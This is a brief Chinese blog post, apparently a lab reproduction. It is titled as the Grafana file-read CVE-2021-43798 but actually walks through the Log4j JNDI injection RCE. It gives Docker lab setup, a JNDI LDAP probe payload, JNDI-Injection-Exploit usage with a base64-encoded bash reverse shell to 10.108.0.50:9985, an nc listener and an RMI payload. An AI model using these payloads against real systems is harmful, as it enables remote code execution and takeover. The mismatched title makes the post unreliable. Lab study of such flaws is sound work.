Grafana任意文件读取漏洞(CVE-2021-43798)

  2021-12-07   漏洞复现   漏洞复现 字数统计: 358字 阅读时长: 1分

漏洞描述

Apache Log4j存在任意代码执行漏洞，经过分析，该组件存在Java JNDI注入漏洞，当程序将用户输入的数据进行日志，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。

Apache Struts2、Apache Solr、Apache Druid、Apache Flink等众多组件与大型应用均受影响，鉴于此漏洞危害巨大，利用门槛极低，建议用户尽快参考缓解方案阻止漏洞攻击。

影响范围

Apache Log4j 2.x <= 2.14.1

漏洞环境搭建

docker pull vulfocus/log4j2-rce-2021-12-09:latest
docker run -dit -p 8081:8080 vulfocus/log4j2-rce-2021-12-09

漏洞利用

验证

漏洞验证，使用dnslog验证网站是否存在漏洞

http://10.108.0.50:58931/hello
payload=${jndi:ldap://9e735f2d.dns.1433.eu.org/xxxxxx}

反弹shell

利用工具：https://github.com/welk1n/JNDI-Injection-Exploit

需要将反弹shell命令使用base64编码

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMDguMC41MC85OTg1IDA+JjE=}|{base64,-d}|{bash,-i}" -A 10.108.0.50

使用nc监听

输入payload

http://10.108.0.50:39428/hello
payload=${jndi:rmi://10.108.0.50:1099/9uf0r6}

成功反弹到shell
